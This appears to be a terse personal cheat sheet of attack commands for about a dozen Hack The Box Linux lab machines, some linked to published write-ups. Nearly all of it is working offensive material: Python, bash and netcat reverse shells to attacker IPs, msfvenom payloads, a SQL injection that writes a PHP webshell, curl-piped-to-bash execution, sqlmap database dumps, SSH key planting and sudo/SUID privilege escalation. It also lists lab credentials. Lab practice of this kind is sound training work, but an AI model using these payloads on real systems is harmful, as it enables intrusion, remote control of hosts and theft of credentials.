# Lin-Backdoor
https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html
```
http://10.10.11.125/wp-content/plugins/
WordPress Plugin eBook Download 1.1 - Directory Traversal
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/812/cmdline
GNU gdbserver 9.2 - Remote Command Execution (RCE)
ps aux
screen -x root/root
```


# Lin-Bashed
https://0xdf.gitlab.io/2018/04/29/htb-bashed.html
```
http://10.10.10.68/dev/phpbash.php
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
nc -nlvp 1234
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
sudo -l
python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -u scriptmanager bash -i
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
python -c shell.py
```


# Lin-Broker
```
nmap -sS -sC -sV -T5 -Pn 10.10.11.243
nmap -p- -T5 10.10.11.243
10.10.11.243/ | admin:admin
activemq broker 5.15.15 exploit
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f elf -o test.elf
python3 -m http.server 8001
nc -lvvp 4444
go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.12:8001/poc-linux.xml
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
python3 -m http.server 80
wget 10.10.14.12/privesc.conf
sudo /usr/sbin/nginx -c /tmp/privesc.conf
curl localhost:1337/etc/shadow
curl localhost:1337/root/root.txt
ssh-keygen -o
wget 10.10.14.12/privesc2.conf
sudo /usr/sbin/nginx -c /tmp/privesc2.conf
curl localhost:1338
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiHugqsdduKFyMsf1Q3e75saE~~~M0swOE2pXf9C5TOU92CZM= root@kali'
<veSLNQaxZV8H8UXg8uM0swOE2pXf9C5TOU92CZM= root@kali'
ssh -i /root/.ssh/id_rsa root@10.10.11.243
```


# Lin-Haircut
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.24/FUZZ -e .aspx,.php,.txt,.html,.sh
http://10.10.10.24/exposed.php
https://github.com/pentestmonkey/php-reverse-shell.git
http://10.10.14.3/php-reverse-shell.php -o uploads/php-reverse-shell.php
nc -nlvp 1234
http://10.10.10.24/uploads/php-reverse-shell.php
python3 -c "import pty;pty.spawn('/bin/bash’)
find / -perm -4000 2>/dev/null
LinEnum.sh
screen 4.5.0 privesc
```


# Lin-Intentions
```
nmap -sS -sC -sV -T5 -Pn 10.10.11.220
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://intentions.htb/FUZZ -fs 162 -e .aspx,.php,.txt,.html,.sh
registration
sqlmap -r req1.txt --batch
sqlmap -r req2b.txt --batch
sqlmap -r req1.txt --second-req=req2.txt --batch --tamper=space2comment
sqlmap -r updateGenresRequest --second-req=fetchFeedRequest --batch --tamper=space2comment --tables
sqlmap -r req1b.txt --second-req=req2b.txt --batch --tamper=space2comment -T users --dump
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/api/v2/auth/ -b 403,404
http://10.10.11.220/api/v2/auth/login
curl -X POST http://intentions.htb/api/v2/auth/login
curl -X POST http://intentions.htb/api/v1/auth/login
curl -d 'email=steve@intentions.htb&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -X POST http://intentions.htb/api/v2/auth/login
http://10.10.11.220/
http://intentions.htb/api/v2/auth/login | Edited: v2, hash
http://intentions.htb/admin#/
http://intentions.htb/api/v2/admin/image/modify
python3 -m http.server 80
http://intentions.htb/api/v2/admin/image/modify
"path":"http://10.10.14.6/test”
curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Ij[SNAP]OTc2ZjcifQ.Y-yF7_2agtJjTqtFeEThuabmwzTvhDCFoq6tHt0l3zc' -F 'path=vid:msl:/tmp/php*' -F 'effect=asd' -F file=@payload.msl
http://intentions.htb/storage/rce.php?c=ls
/bin/bash -i >& /dev/tcp/10.10.14.6/9001 0>&1
nc -nlvp 9001
http://intentions.htb/storage/rce.php?c=curl%2010.10.14.6/shell|bash
ls –la
git log –p
git config --global --add safe.directory /var/www/html/intentions
HOME=/tmp git config --global --add safe.directory /var/www/html/intentions
HOME=/tmp git log –p
ssh greg@intentions.htb | Gr3g1sTh3B3stDev3l0per!1998!
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
getcap /opt/scanner/scanner
python3 extract.py
ssh –i root_key6 root@10.10.11.220
```


# Lin-Jarvis
https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
```
SQL injection
http://10.10.10.143/room.php?cod=2 and 1=1
Webshell
http://10.10.10.143/room.php?cod=-2 UNION SELECT 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.3/1234 0>&1"'
sudo -l
Reverse Shell - Bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"' > /tmp/shell.sh
sudo -u pepper /var/www/Admin-Utilities/simpler.py –p
find / -perm -4000 2>/dev/null
LinEnum
PrivEsc - SUID systemctl
```


# Lin-OpenSource
```
http://10.10.11.164/download
source.zip
git log
http://10.10.11.164/upcloud
..//app/app/views.py
nc -lvnp 443
http://10.10.11.164/0xdf
ifconfig
wget http://10.10.14.2:8000/chisel_1.9.0_linux_amd64
/chisel_1.9.0_linux_amd64 server -p 8000 –reverse
./chisel_1.9.0_linux_amd64 client 10.10.14.2:8000 R:3000:172.17.0.1:3000
http://127.0.0.1:3000/
Soulless_Developer#2022
http://127.0.0.1:3000/dev01/home-backup/src/branch/main/.ssh/id_rsa
ssh -i id_rsa dev01@10.10.11.164
./pspy64
/usr/local/bin/git-sync
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
ls -l /tmp/0xdf
/tmp/0xdf -p
```

# Lin-Pandora
```
nmap -sU -T5 10.10.11.136
snmpwalk -v 1 -c public 10.10.11.136
ssh daniel@10.10.11.136
ssh -D 9090 daniel@10.10.11.136
http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
Upload - php-reverse-shell.php
./LinEnum.sh
cat .ssh/id_rsa.pub
SUID - /usr/bin/pandora_backup
```

# Lin-Soccer
```
nmap -p- -T5 -Pn 10.10.11.194
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://soccer.htb/tiny/FUZZ -fw 4 -e .aspx,.php,.txt,.html,.sh
google: tiny file manager default credentials
admin/admin@123
git clone https://github.com/pentestmonkey/php-reverse-shell.git
nc -nlvp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 –batch
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump –batch
ssh player@10.10.11.194
find / -type f -perm -4000 2>/dev/null
cat /usr/local/etc/doas.conf
man dstat
ls -ld /usr/local/share/dstat
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
doas /usr/bin/dstat –list
doas /usr/bin/dstat --pwn
```

# Lin-SolidState
https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
```
nmap -p- -T5 10.10.10.51
Apache James Server 2.3.2
nc 10.10.10.51 4555
telnet 10.10.10.51 110
ssh mindy@10.10.10.51 -t bash
nc -e /bin/sh 10.10.14.7 4444
```

# Lin-UpDown
```
nmap -sS -sC -sV -T5 -Pn 10.10.11.177
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.177/FUZZ -fs 277 -e .aspx,.php,.txt,.html,.sh
gobuster dir -u 10.10.11.177 -w /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://10.10.11.177/dev/ -w /usr/share/dirb/wordlists/common.txt
http://10.10.11.177/
http://10.10.11.177/dev/
http://10.10.11.177/dev/.git/
pip install git-dumper
git-dumper http://10.10.11.177/dev/.git /home/itsec/Documents/HTB-UpDown/dev/
git log
Proxy – Match and replace rules
http://dev.siteisup.htb/
echo "<?php phpinfo(); ?>" > info.php
zip info.zip info.php
mv info.zip info.txt
http://dev.siteisup.htb/uploads/
http://dev.siteisup.htb/?page=phar://uploads/81d6840826b9f6ab35021cfbc006b9be/info.txt/info
https://github.com/teambi0s/dfunc-bypasser
./dfunc-bypasser.py --url 'http://dev.siteisup.htb/?page=phar://uploads/e744af4911ee9e365e53bebef0ee2496/info.txt/info'
nano rev.php
zip rev.zip rev.php
mv rev.zip rev.txt
cd /home/developer/dev
./siteisup
__import__('os').system('/bin/bash')
cd .ssh
chmod 600 id_rsa
ssh -i id_rsa developer@10.10.11.177
sudo –l
https://gtfobins.github.io/gtfobins/easy_install/
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
